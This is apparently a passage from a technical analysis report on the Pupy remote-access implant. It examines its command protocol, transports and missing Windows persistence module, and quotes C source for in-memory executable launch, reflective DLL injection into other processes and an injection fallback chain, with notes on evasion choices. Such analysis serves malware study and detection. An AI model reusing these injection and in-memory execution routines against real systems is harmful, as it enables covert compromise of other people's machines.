> **The checksum interface is keyed-by-design; the shipped default is unkeyed.** `nonce` is threaded through all six signatures and handed to a replaceable `gen_csum`/`check_csum` pair; the default implementations (`Parcel._gen_crc32`/`_check_crc32`) simply do not use it. Supplying a keyed pair gives a keyed channel, and nothing in the code prevents it. `[source: picocmd.py:1780-1787, :1790, :1796, :1804, :1815]`

**State it that way.** "Unkeyed CRC" understates the design and wrongly implies an API defect: the pluggability point at `:1790`/`:1804` shows the extension path was provided on purpose. What is unkeyed is one default implementation, not the interface. `[source: picocmd.py:1790, :1804]`

(Attribution: the six-signature grep and the `:1790` pluggability observation came from the Lead's verification of D6 §13. The conclusion drawn from them — that this is a correct-by-design interface with a weak default, rather than a weak interface — is the refinement that belongs in the final form. `[source: Lead verification pass, task-14 acceptance]`)

**This is the answer to the question about the relationship to §2's key-prepended SHA-1.** It is a **different and weaker construction at a different layer**:

| | ECPV `gen_csum` (§2.10) | picocmd `_gen_crc32` (§13.2) |
|---|---|---|
| Hash | SHA-1 | CRC-32 (non-cryptographic) |
| Length | 4 bytes | 4 bytes |
| Key | **key-prepended** (key ‖ msg ‖ len ‖ nonce) | **NONE** — `nonce` ignored |
| HMAC | no | no |
| Purpose | transport frame integrity | parcel integrity |
| Threat | length extension | **anyone can forge; no integrity at all** |

`[sources: ecpv.py:283-289, :299-305; picocmd.py:1779-1787]`

There is **no relationship** between them beyond both being 4 bytes: neither derives from the other, they cover different data, and the picocmd one is **unkeyed**. The ECPV checksum is weak (32-bit, non-HMAC, length-extendable) but *is* keyed; the picocmd CRC is **not keyed at all**, making it a pure accidental-corruption detector with zero adversarial resistance. `[sources as cited; inference]`

Note also that `pack`/`unpack` accept `gen_csum`/`check_csum` overrides (`:1790`, `:1804`) — a caller can substitute a stronger checksum. The **default**, however, is plain CRC-32. `[source: picocmd.py:1790, :1804]`

### 13.3 Command dispatch — the exact table

```python
# picocmd.py:181-206
class EncodingTable(object):
    __slots__ = ('_encode', '_decode')

    def __init__(self, *alphabet, **kwargs):
        start = kwargs.get('start', 0)
        self._decode = dict(enumerate(alphabet, start))
        self._encode = {
            self._decode[k]:k for k in self._decode
        }

    def is_registered(self, value):
        return value in self._encode

    def encode(self, value):
        encoded = self._encode.get(value, None)
        if encoded is None:
            raise EncodingTableUnregisteredElement(value)

        return encoded
```
`[source: pupy/network/lib/picocmd/picocmd.py:181-206]`

`EncodingTable` is a **bidirectional class↔integer map built by positional `enumerate`**, `start=0` by default. Registration is purely positional — the wire ID of every command is its **index in the constructor call**:

```python
# picocmd.py:1746-1757
# Explicitly define commands. In other case make break something

registered_commands = EncodingTable(
    Poll, Ack, Policy, Idle, Kex,
    Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
    Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
    SetProxy, OnlineStatusRequest, OnlineStatus, ConnectablePort,
    PortQuizPort, PupyState, CustomEvent,
    # V2 Commands
    SystemInfoEx, ConnectEx, RegisterHostnameId,
    DataTransferControl, DataTransferPayload, InBandExecute
)
```
`[source: pupy/network/lib/picocmd/picocmd.py:1746-1757]`

**The resolved dispatch table — wire ID is the ordinal:**

| ID | Command | | ID | Command |
|---|---|---|---|---|
| 0 | `Poll` | | 15 | `SystemStatus` |
| 1 | `Ack` | | 16 | `SetProxy` |
| 2 | `Policy` | | 17 | `OnlineStatusRequest` |
| 3 | `Idle` | | 18 | `OnlineStatus` |
| 4 | `Kex` | | 19 | `ConnectablePort` |
| 5 | `Connect` | | 20 | `PortQuizPort` |
| 6 | `PasteLink` | | 21 | `PupyState` |
| 7 | `SystemInfo` | | 22 | `CustomEvent` |
| 8 | `Error` | | **23** | **`SystemInfoEx`** ← V2 begins |
| 9 | `Disconnect` | | 24 | `ConnectEx` |
| 10 | `Exit` | | 25 | `RegisterHostnameId` |
| 11 | `Sleep` | | 26 | `DataTransferControl` |
| 12 | `Reexec` | | 27 | `DataTransferPayload` |
| 13 | `DownloadExec` | | 28 | `InBandExecute` |
| 14 | `CheckConnect` | | | |

`[source: picocmd.py:1748-1757 — ordinals by positional enumerate]`

**The V2 boundary is ID 23.** IDs 0–22 are V1; 23–28 are V2. The comment at `:1754` marks it, and the in-code comment at `:1746` — `"In other case make break something"` — is the author's own warning that **reordering, inserting, or removing any entry renumbers every subsequent command and breaks protocol compatibility.** Appending is the only safe operation, which is exactly what the V2 block does. `[source: picocmd.py:1746-1757]`

**This is the fifth independent instance of the ordinal-coupled-enum fragility** first documented in D2 (R-1) and re-observed in the bare-int `LAUNCHER_TYPE_*` constants (§3.3). Pupy uses positional registration, bare-int enums and ordinal IDs throughout; there is not a single fixed-width explicitly-numbered wire constant in this protocol. `[sources: picocmd.py:181-206, :1748-1757; §3.3; D2 R-1]`

Registration is validated at construction:

```python
# picocmd.py:1759-1771
def __init__(self, commands):
    missing = set()

    for command in commands:
        kommand = type(command)

        if not Parcel.registered_commands.is_registered(kommand):
            missing.add(kommand)

    if missing:
        raise ParcelInvalidCommand(missing)

    self.commands = commands
```
`[source: pupy/network/lib/picocmd/picocmd.py:1759-1771]` — a `Parcel` refuses to exist if any contained command is unregistered, so a **desynchronised command table fails loudly at construction** rather than silently mis-dispatching. That is the one mitigation against the ordinal fragility, and it is a good one. `[source: picocmd.py:1759-1771]`

Dispatch at unpack is a **dict lookup on the ordinal**, not a branch chain:

```python
# picocmd.py:1820-1821
cmd, offt = Parcel.registered_commands.decode(
    ord(command)).unpack(data)
```
`[source: pupy/network/lib/picocmd/picocmd.py:1820-1821]` — `decode(ord(...))` resolves the ID to a *class*, and then calls that class's **static `unpack(data)`**, which returns `(instance, consumed_bytes)`. The `offt` advances the cursor (`:1823`). So each command carries its own length knowledge; there is no length prefix. `[source: picocmd.py:1820-1823]`

### 13.4 The V1/V2 encoder branch — settled precisely

The version is a **self-describing byte inside the message**, not an external negotiation for the `SystemInfoEx` path:

```python
# picocmd.py:1351-1357
@staticmethod
def unpack(data):
    version = ord(data[0])
    if version == 1:
        return SystemInfoEx._unpack_v1(data)
    else:
        raise NotImplementedError(
```
`[source: pupy/network/lib/picocmd/picocmd.py:1351-1357]`

So `SystemInfoEx.unpack` **reads a version byte at offset 0 and branches**, with `version == 1` routing to `_unpack_v1` and **anything else raising `NotImplementedError`**. The V2 path is therefore *not* in this function — only V1 is implemented at this dispatch point. That is a **concrete correction to §4.8's implication** that `_unpack_v1` is a legacy fallback: at `:1351-1357` it is the **only implemented branch**, and `version == 2` is an explicit failure. `[source: picocmd.py:1351-1357; §4.8]`

The V1 body uses a **flag-bitfield with variable-length trailing fields**:

```python
# picocmd.py:1331-1345
if isset(flags, SystemInfoEx.HAS_INTERNAL_IP):
    if isset(flags, SystemInfoEx.INTERNAL_IP_IS_IPV6):
        internal_ip = unpack_ip_address(data[consumed:consumed+16])
        consumed += 16
    else:
        internal_ip = unpack_ip_address(data[consumed:consumed+4])
        consumed += 4

if isset(flags, SystemInfoEx.HAS_EXTERNAL_IP):
    if isset(flags, SystemInfoEx.EXTERNAL_IP_IS_IPV6):
        external_ip = unpack_ip_address(data[consumed:consumed+16])
        consumed += 16
    else:
        external_ip = unpack_ip_address(data[consumed:consumed+4])
        consumed += 4
```
`[source: pupy/network/lib/picocmd/picocmd.py:1331-1345]`

An IPv4 address is **4 bytes** and an IPv6 address is **16 bytes**, selected by a nested flag bit. So `SystemInfoEx` is a **presence-bitfield with type-dependent field widths** — the classic compact-encoding design, and the reason a flag must be read before the field width is known. `[source: picocmd.py:1331-1345]`

### 13.5 `DataTransferControl` — the one command with explicit field validation

```python
# picocmd.py:1517-1545, :1570, :1584
class DataTransferControl(Command):
    __slots__ = ('transfer_id', 'total_size', 'crc', 'action')

    ACTION_START = 0x0
    ACTION_CANCEL = 0x1
    ACTION_FINISH = 0x2
    ACTION_CORRUPTED = 0x3

    def __init__(self, action, transfer_id, total_size=None, crc=None):
        if transfer_id > 0xF:
            raise ValueError('transfer_id should be less than 0xF')

        if action == DataTransferControl.ACTION_START:
            if (total_size is None or crc is None):
                raise ValueError('total_size and crc must be specified')

            if type(crc) not in (int, long) or crc < 0 or crc > 0xFFFFFFFF:
                raise ValueError('Invalid CRC field, should be uint32')

            if total_size > 0xFFFF:
                raise ValueError('total_size should be less than 0xFFFF')
...
        self.crc = crc
...
        packed += struct.pack('>HI', self.total_size, self.crc)
...
        total_size, crc = struct.unpack_from('>HI', data[1:])
```
`[source: pupy/network/lib/picocmd/picocmd.py:1517-1545, :1570, :1584]`

- `transfer_id > 0xF` — a **4-bit** field, guard correct for a max of 15.
- `action` is **2 bits** (0–3), range-validated at `:1539-1541`.
- `total_size` is `uint16` (capped `0xFFFF`), `crc` is `uint32` — packed **`'>HI'` (big-endian)** at `:1570`, read back **`'>HI'`** at `:1584`, symmetric. `[source: picocmd.py:1536, :1533, :1570, :1584]`

**Endianness is inconsistent across the stack**: `DataTransferControl` uses `'>HI'` (big-endian) while EC4's KEX length prefix uses native-order `'H'` (`ec4.py:57, :71, :116`, §3.1). Two framing layers in the same product, opposite endianness. `[sources: picocmd.py:1570; ec4.py:57, :71, :116; §3.1]`

`type(crc) not in (int, long)` — a **Python-2 `long` reference** surviving under the `from __future__` py3 shim, the same vestige pattern as `ecpv.py`'s py2 branch (§2.1). `[source: picocmd.py:1533; §2.1]`

### 13.6 The two transport trees — the distinction, stated plainly

The Lead flagged this because he briefly conflated them while verifying §5. It is worth stating explicitly, because the names are one directory apart:

| Path | Contents | Role |
|---|---|---|
| `pupy/network/lib/transports/` | **8 files** — `dummy.py` 730, `ec4.py` 3,437, `ecm.py` 5,657, `http.py` 13,851, `httpwrap.py` 7,413, `rsa_aes.py` 9,625, `utils.py` 528, `__init__.py` **0** — plus subdirs `cryptoutils/` 28,499, `obfs3/` 14,088, `obfscommon/` 1,779 | **The implementations.** Transport *classes* live here as importable modules. |
| `pupy/network/transports/` | **13 packages** — `dfws`, `ec4`, `ecm`, `http`, `kc4`, `obfs3`, `rsa`, `ssl`, `ssl_rsa`, `tcp_cleartext`, `udp_cleartext`, `udp_secure`, `ws` — each with a `conf.py` | **The registrations.** Each package is one `TransportConf` descriptor naming the transport, declaring its stream/credentials, and wiring implementation classes from the tree above. |

`[source: measured both trees]`

The relationship: `pupy/network/transports/<X>/conf.py` **imports from** `pupy/network/lib/transports/`. `transports/ec4/conf.py:16` does `client_transport = EC4TransportClient`, and `EC4TransportClient` is defined in `lib/transports/ec4.py`. The registry (`conf.py:51`) iterates the **first** tree's parent to discover the 13 conf packages; each conf then imports its implementation from the **second** tree. `[source: network/conf.py:50-52; transports/ec4/conf.py:16; lib/transports/ec4.py]`

A corollary: **`lib/transports/__init__.py` is 0 bytes** while `network/transports/__init__.py` is the 130-line `Transport` base class. Two files of the same name, one empty, one the base class — an easy source of confusion. `[source: measured lib/transports/__init__.py: 0 B; network/transports/__init__.py: 130 lines]`

### 13.7 The persistence correction — restated as the headline it is

§11.1 carries this; restated standalone:

> **`pupy/packages/windows/all/pupwinutils/persistence.py` does not exist.** It is imported at `pupy/scriptlets/persistence.py:29` (`from pupwinutils.persistence import add_registry_startup`), declared as a dependency at `:9` (`'windows': ['pupwinutils.persistence']`), and invoked at `:66` (`if not add_registry_startup(cmd, regkey):`). The directory `pupwinutils/` holds 15 files and no `persistence.py`. **`pupwinutils.persistence` is the ONLY dangling `pupwinutils.*` reference in the entire tree** — every other module in that namespace resolves to a real file. Windows persistence is therefore **verified non-functional as shipped**: the configuration is present and default-configured (`pupy.conf.default:178-181`, `name = OneDriveUpdate`, `preferred_methods = 2,8,3,9`), the CLI module is present (`modules/persistence.py`), the scriptlet is present, and the leaf that performs the registry write was never committed. The Linux counterpart **is** present (`packages/linux/all/persistence.py`, 13,088 B). `[sources: scriptlets/persistence.py:9, :29, :66; measured pupwinutils/ 15 files; pupy.conf.default:178-181; measured packages/linux/all/persistence.py]`

The "only dangling reference" detail is what converts this from *maybe a packaging quirk* into *verified non-functional*: if several `pupwinutils` imports were unresolved, the natural explanation would be an incomplete extraction of this corpus. Because exactly one is unresolved and every sibling resolves, the absence is a property of the **upstream project**, not of the copy analysed. That is the difference between an artefact and a finding. `[source: D6 §11.1; independently confirmed by the Lead]`

---

## 14. U-4 closed — the remaining `client/` native surface

### 14.1 `sources-windows-py3/pupy.c` — the `_pupy` C extension (529 lines, 17,967 B)

This is the **source of `_pupy.pyd`**, the module `xz_dynload`ed at `pupy_load.c:366-418` (§1.8) and whose `PyInit__pupy` is resolved by name and installed with `_PyImport_FixupExtensionObject`. It is the **native boundary between the Python agent and the Windows API** — every privileged operation the implant performs above the Win32 wrapper layer is a method on this module. `[source: client/sources-windows-py3/pupy.c:461-484; §1.8]`

**The complete exported method table:**

```c
// pupy.c:427-441
static PyMethodDef methods[] = {
        { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
        { "_set_shared", Py_set_is_shared_object, METH_NOARGS, DOC("") },
        { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
        { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
         DOC("reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure") },
        { "mexec", Py_mexec, METH_VARARGS|METH_KEYWORDS, DOC("mexec(cmdline, raw_pe, redirected_stdio=True, hidden=True)") },
        { "import_module", import_module, METH_VARARGS,
          "import_module(data, size, initfuncname, path) -> module" },
        { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
        { "set_exit_session_callback", Py_set_exit_session_callback, METH_VARARGS, DOC("set_exit_session_callback(function)")},
        { "find_function_address", Py_find_function_address, METH_VARARGS,
          DOC("find_function_address(dllname, function) -> address") },
        { NULL, NULL},         /* Sentinel */
};
```
`[source: client/sources-windows-py3/pupy.c:427-441]`

Nine methods. The module docstring is `module_doc[] = DOC("Builtins utilities for pupy")` (`:24`) — it is presented to Python as **`_pupy`**, the "builtins utilities". `:446-453` defines the module as `"_pupy"` with `-1` per-interpreter state (module-global state). `[source: pupy.c:24, :446-453]`

**The two capability primitives that matter:**

**(a) `mexec` — in-memory executable execution, `:80-267`.** This is the largest function in the file (188 lines) and the mechanism behind the `memexec`/`mexec` package modules.

```c
// pupy.c:80-99, :96
static PyObject *Py_mexec(PyObject *self, PyObject *args) {
        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        SECURITY_ATTRIBUTES saAttr = {
                sizeof(SECURITY_ATTRIBUTES),
                NULL,
                TRUE
        };

        HANDLE g_hChildStd_IN_Rd = NULL;
        HANDLE g_hChildStd_IN_Wr = NULL;
        HANDLE g_hChildStd_OUT_Rd = NULL;
        HANDLE g_hChildStd_OUT_Wr = NULL;
        BOOL inherit = FALSE;
        PyObject* py_redirect_stdio = NULL;
        PyObject* py_hidden = NULL;
        DWORD createFlags = CREATE_SUSPENDED|CREATE_NEW_CONSOLE;
        PyObject* py_cmdline = NULL;
        char *pe_raw_bytes;
        int pe_raw_bytes_len;
```
`[source: client/sources-windows-py3/pupy.c:80-99]`

**`DWORD createFlags = CREATE_SUSPENDED|CREATE_NEW_CONSOLE;` (`:96`)** — the child is created **suspended**, so the payload PE can be written into it and the primary thread resumed only after the image is mapped. The process is created with **its own new console** (`CREATE_NEW_CONSOLE`), which is the containment for the `hidden` parameter. `[source: pupy.c:96]`

The stdio redirection uses an inheritable pipe triple created with `bInheritHandle = TRUE` (`:83-87`), and the function returns the three handles to Python:

```c
// pupy.c:266
return Py_BuildValue("(III)", pi.hProcess, g_hChildStd_IN_Wr, g_hChildStd_OUT_Rd);
```
`[source: client/sources-windows-py3/pupy.c:266]` — **the child's process handle, the parent's write end of its stdin, and the parent's read end of its stdout** are handed back to Python as a 3-tuple. So the Python layer drives the injected process's I/O directly. `[source: pupy.c:266]`

The `_WIN64` argument-parsing divergence is a real detail: on 64-bit the fourth optional argument is parsed as **`"K"`** (an *unsigned long long*), on 32-bit as **`"I"`** (unsigned int), because a handle address does not fit the 32-bit parser:

```c
// pupy.c:106-114 (_WIN64)
if (!PyArg_ParseTuple(
                args,
                "Os#|OOK",
                &py_cmdline, &pe_raw_bytes, &pe_raw_bytes_len,
                &py_redirect_stdio, &py_hidden, &dupHandleAddressPLL))
        // the address of the handle is directly passed with ctypes
        return NULL;

dupHandleAddress = (void **) ((DWORD_PTR) dupHandleAddressPLL);
```
`[source: pupy.c:106-114]` with the comment `// the address of the handle is directly passed with ctypes` at `:111` — the Python caller passes an **integer address** of a handle variable it owns, and C writes back into it. `[source: pupy.c:106-125]`

The cmdline is required to be Unicode:

```c
// pupy.c:128-132
if (!(PyUnicode_Check(py_cmdline))) {
        return PyErr_Format(
                PyExc_Exception, "cmdline must be unicode"
        );
}
```
`[source: pupy.c:128-132]` — consistent with the `W`-suffixed wide API throughout, and the reason `pupy_load.c:76-177` implements `CommandLineToArgvA` by converting through `WideCharToMultiByte(CP_UTF8, ...)` (§1.3). `[source: pupy.c:128-132; §1.3]`

`hidden` is implemented as `STARTF_USESHOWWINDOW` (`:138-139`), with `si.cb = sizeof(STARTUPINFO)` set before the memset-derived zeroes are relied upon (`:134-136`). `[source: pupy.c:134-139]`

**(b) `reflective_inject_dll` — cross-process reflective injection, `:270-295`.**

```c
// pupy.c:270-295
static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
        DWORD dwPid;
        const char *lpDllBuffer;
        DWORD dwDllLenght;
        const char *cpCommandLine;
        PyObject* py_is64bit;
        int is64bits;
        if (!PyArg_ParseTuple(args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
                return NULL;
        is64bits = PyObject_IsTrue(py_is64bit);
        if(is64bits){
                is64bits=PROCESS_ARCH_X64;
        }else{
                is64bits=PROCESS_ARCH_X86;
        }
        if(dwPid == 0) {
            return PyErr_Format(
                    PyExc_Exception,
                    "Cannot inject in pid %d", dwPid
            );
        }
        if(inject_dll( dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
                return NULL;
        return PyBool_FromLong(1);
}
```
`[source: client/sources-windows-py3/pupy.c:270-295]`

The caller supplies **the target architecture** as a Python truth value (`:276-285`), converted to `PROCESS_ARCH_X64`/`PROCESS_ARCH_X86` — so **the Python layer is responsible for knowing whether the target process is 64-bit**, and there is no in-C check against the actual target. Injecting a 64-bit DLL into a 32-bit process (or vice versa) is a caller error the C code does not catch. `[source: pupy.c:276-285]`

`pid == 0` is rejected explicitly (`:286-291`) with a formatted exception; a zero pid would make `inject_dll` target something other than an intended process. `[source: pupy.c:286-291]`

Note the **unused local `cpCommandLine`** declared at `:275` and never used — a vestige of a parameter that was removed. `[source: pupy.c:275]`

**(c) `load_dll` / `find_function_address` / `import_module` — the by-name resolution boundary.**

```c
// pupy.c:297-321
static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
        DWORD dwPid;
        const char *lpDllBuffer;
        DWORD dwDllLenght;

        const char *dllname;
        if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
                return NULL;

        return PyLong_FromVoidPtr(MyLoadLibrary(dllname, lpDllBuffer, NULL));
}

static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
{
        const char *lpDllName = NULL;
        const char *lpFuncName = NULL;
        void *address = NULL;

        if (PyArg_ParseTuple(args, "ss", &lpDllName, &lpFuncName)) {
                address = MyFindProcAddress(lpDllName, lpFuncName);
        }

        return PyLong_FromVoidPtr(address);
}
```
`[source: client/sources-windows-py3/pupy.c:297-321]`

**`MyFindProcAddress(lpDllName, lpFuncName)` — resolution is by NAME, from a C string.** This is the load-bearing confirmation of §11.2's claim: the implant resolves every symbol by string name against its privately-mapped libraries, never by ordinal or SSN. `MyLoadLibrary(dllname, lpDllBuffer, NULL)` loads **from a caller-supplied byte buffer**, which is the in-memory loader path. `[source: pupy.c:307, :317; §11.2]`

Three unused locals again — `dwPid`, `lpDllBuffer`, `dwDllLenght` declared at `:299-301` and shadowed/unused in `Py_load_dll`. `[source: pupy.c:299-301]`

**`is_shared` / `_set_shared` — the build-path discriminator:**

```c
// pupy.c:323-329
static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
{
        return PyBool_FromLong(is_shared);
}
```
`[source: pupy.c:323-329]` with `static int is_shared = 0;` at `:40`. This reports whether the payload is a **shared object** (the Linux/Android `.so` path) vs an executable — the same discriminator family as `"rustc" in sys.version` in `agent/__init__.py:1037` (§6.6). `[source: pupy.c:40, :323-329; §6.6]`

**Module init and the args-passing convention:**

```c
// pupy.c:455-483
#ifdef _PUPY_DYNLOAD
#define FUNC_EXPORT PyMODINIT_FUNC
#else
#define FUNC_EXPORT void *
#endif

FUNC_EXPORT PyInit__pupy(void) {
        PyObject *pupy;
        pupy = PyModule_Create(&PupyModuleDef);
        if (!pupy) {
                return NULL;
        }
        ...
        PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
        ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
```
`[source: pupy.c:455-483]`

- **`FUNC_EXPORT` is conditional on `_PUPY_DYNLOAD`** (`:455-459`): when dynloading, `PyInit__pupy` is a normal `PyMODINIT_FUNC`; otherwise it is a **plain `void *`**, allowing the loader to find it as an exported address rather than call it through the CPython init convention. This is the same `_PUPY_DYNLOAD` flag that gates `#include "_pupy_pyd.c"` at `pupy_load.c:20-28` (§1.2). `[source: pupy.c:455-459; §1.2]`
- **`GIT_REVISION_HEAD`** is compiled in as the module's `revision` string constant (`:471`) — the **build commit hash is embedded in every payload**, and `agent/__init__.py:36` lists `'revision'` in the agent's public surface. That is a precise version-IOC for any recovered payload. `[source: pupy.c:471; agent/__init__.py:36]`
- `ExecError = PyErr_NewException("_pupy.error", NULL, NULL)` (`:472`) creates a dedicated exception type, added via `PyModule_AddObject(pupy, "error", ExecError)` (`:475`). Error handling is disciplined: every failure path increments/decrements correctly and returns `NULL` after setting a Python exception. `[source: pupy.c:472-480]`

```c
// pupy.c:486-516
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    DWORD threadId;
    BOOL bReturnValue = TRUE;

    switch( dwReason )
    {
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *(HMODULE *)lpReserved = hAppInstance;
        break;
        ...
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            if (lpReserved > 0xFFFF) {
                _pupy_pyd_args_t *args =
                        (_pupy_pyd_args_t*) lpReserved;

                if (args->pvMemoryLibraries) {
                        MySetLibraries(args->pvMemoryLibraries);
                }

                args->cbExit = on_exit_session;
                args->blInitialized = TRUE;
            }
            return TRUE;
```
`[source: client/sources-windows-py3/pupy.c:486-516]`

**`if (lpReserved > 0xFFFF)` at `:505` is the args-passing convention.** A real `lpReserved` for a loader-invoked `DllMain` is either NULL or a small sentinel, so a value **above 0xFFFF cannot be a loader-supplied flag — it must be a pointer**, and the code casts it to `_pupy_pyd_args_t *`. This mirrors the `lpReserved == (LPVOID) 0x1` / `0x2` sentinel tests in `main_reflective.c:55, :64` (§1.9): **the same parameter is overloaded with three meanings across two files** — sentinel `0`, sentinel `0x1`/`0x2`, or a genuine pointer. The `pupy_load.c:381-418` call site is what fills that struct and passes it in. `[source: pupy.c:505-515; main_reflective.c:55, :64; pupy_load.c:381-418; §1.8, §1.9]`

The struct fields consumed here — `pvMemoryLibraries`, `cbExit`, `blInitialized` — are written back into the caller's struct: `args->cbExit = on_exit_session;` installs the C-level exit callback, and `args->blInitialized = TRUE` (`:513-514`) is the **handshake back to the loader confirming the module initialised**, which is what `pupy_load.c` waits on before calling `PyInit__pupy`. `[source: pupy.c:505-515; §1.8]`

**Summary of `pupy.c`:** nine methods exposing in-memory PE execution (`mexec`), cross-process reflective injection (`reflective_inject_dll`), buffer-based DLL loading (`load_dll`), **name-based** symbol resolution (`find_function_address`), a module import primitive, and two build-marker accessors. Every privileged operation is a by-name, in-memory, buffer-driven call. No syscall stubs, no ordinal resolution — consistent with §11.2. `[sources as cited]`

### 14.2 `base_inject.c` — the injection-method matrix (603 lines, 27,552 B)

This is where the injection *techniques* live. There are **three**, and `inject_dll` tries them in a fixed fallback order:

| Line | Function | Technique |
|---|---|---|
| `:140` | `inject_via_apcthread` | Queue an APC into the target |
| `:363` | `inject_via_remotethread_wow64` | Remote thread, 32-bit target from 64-bit injector |
| `:444` | `inject_via_remotethread` | Direct remote thread |
| `:516` | `inject_dll` | Orchestrator + fallback chain |

`[source: client/sources-windows-py3/base_inject.c:140, :363, :444, :516]`

```c
// base_inject.c:539-550
dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer );
if( !dwReflectiveLoaderOffset )
    BREAK_ON_ERROR( "[INJECT] inject_dll. GetReflectiveLoaderOffset failed." );
...
hProcess = OpenProcess(
        PROCESS_VM_OPERATION | \
        PROCESS_VM_WRITE | \
        PROCESS_CREATE_THREAD | \
        PROCESS_QUERY_INFORMATION,
        FALSE, dwPid );
```
`[source: base_inject.c:539-550]`

**`GetReflectiveLoaderOffset(lpDllBuffer)` (`:539`) is the crux.** The injector does not need a separate loader stub: it locates the `ReflectiveLoader` export **inside the DLL bytes it was handed**, then computes the remote entry point as a byte offset from the remote allocation base:

```c
// base_inject.c:566-580
lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwDllLenght, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
if( !lpRemoteLibraryBuffer )
    BREAK_ON_ERROR( "[INJECT] inject_dll. VirtualAllocEx failed" );

// write the image into the host process...
if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLenght, NULL ) )
    BREAK_ON_ERROR( "[INJECT] inject_dll. WriteProcessMemory 2 failed" );

// add the offset to ReflectiveLoader() to the remote library address...
lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

lpExecutableRegion = (LPVOID) (((UINT_PTR) lpReflectiveLoader) - (((UINT_PTR) lpReflectiveLoader) % 8192));

if ( !VirtualProtectEx( hProcess, lpExecutableRegion, 16384, PAGE_EXECUTE_READ, &dwOldProtection) )
    BREAK_ON_ERROR( "[INJECT] inject_dll. VirtualProtectEx failed" );
```
`[source: base_inject.c:566-580]`

Three details worth naming:

1. **The buffer is allocated `PAGE_READWRITE`, not RWX** (`:566`) — the classic OPSEC improvement over `VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)`. Memory is written as RW, then the **loader's own page range is flipped to `PAGE_EXECUTE_READ`** (`:579`).
2. **The protection flip is page-aligned by hand** (`:577`): `lpExecutableRegion = lpReflectiveLoader - (lpReflectiveLoader % 8192)` rounds *down* to the 8 KiB page boundary, and `16384` bytes (two pages) are re-protected. This exists because `VirtualProtectEx` requires a page-aligned base — the author computes it arithmetically rather than calling `VirtualQuery`.
3. **`PAGE_EXECUTE_READ` (`:579`), not `PAGE_EXECUTE_READWRITE`** — the protected region is execute-and-read only. Writable+executable is avoided on the loader's pages.

**The fallback chain, quoted in full:**

```c
// base_inject.c:582-591
// First we try to inject by directly creating a remote thread in the target process
if( inject_via_remotethread( hProcess, remoteProcessArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
{
    dprint(
        "[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread...\n");

    // If that fails we can try to migrate via a queued APC in the target process
    if( inject_via_apcthread( hProcess, dwPid, remoteProcessArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
    BREAK_ON_ERROR( "[INJECT] inject_dll. inject_via_apcthread failed" )
}
```
`[source: base_inject.c:582-591]`

**Remote thread first, APC second.** The reasons are operational: `CreateRemoteThread` is noisier and more commonly hooked, but it fires immediately and needs no alertable wait. A queued APC requires the target thread to enter an alertable state, which is *stealthier* but *unreliable* — so the reliable-and-detectable method is attempted first, with the stealthier method as the fallback. That is the opposite of the expected ordering for an evasion-focused tool, and the comment (`:582`, `:588`) shows it is deliberate. `[source: base_inject.c:582-591; inference]`

`inject_via_remotethread_wow64` (`:363`) exists as a third function but is **not called from `inject_dll`'s chain** — it is the cross-bitness path, selected by the caller when `remoteProcessArch` demands it. `[source: base_inject.c:363, :444, :583]`

Error handling is uniformly structured: `dwResult = ERROR_ACCESS_DENIED` as the initialised failure value (`:518`), a `do { ... } while(0)` block with `BREAK_ON_ERROR` macros, and a single `CloseHandle(hProcess)` on the exit path (`:597-598`). The `do/while(0)` idiom gives `break`-based cleanup without `goto`. `[source: base_inject.c:518, :533, :595-602]`

### 14.3 `ReflectiveLoader.c` — hash-resolved, position-independent (535 lines, 24,247 B)

Confirmed as the **Fewer ReflectiveLoader** lineage (`ReflectiveDllInjection.h` ships alongside, 2,770 B). It has exactly one exported function and one helper:

```c
// ReflectiveLoader.c:33-38
#pragma intrinsic(_ReturnAddress)
// This function can not be inlined by the compiler or we will not get the address we expect. Ideally
// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of
// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics
// available (and no inline asm available under x64).
__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }
```
`[source: client/sources-windows-py3/ReflectiveLoader.c:33-38]`

**`caller()` is the position-independence trick**: `_ReturnAddress()` yields the loader's own current address, and the `__declspec(noinline)` plus the author's comment at `:34-37` explain that inlining would break the address derivation. This is the self-locating mechanism that makes the loader work from an arbitrary `VirtualAllocEx` address with no relocations applied. `[source: ReflectiveLoader.c:33-38]`

The import resolution structures are **hash-based, not name-based**:

```c
// ReflectiveLoader.c:43-52
typedef struct {
    DWORD dwFunctionHash;
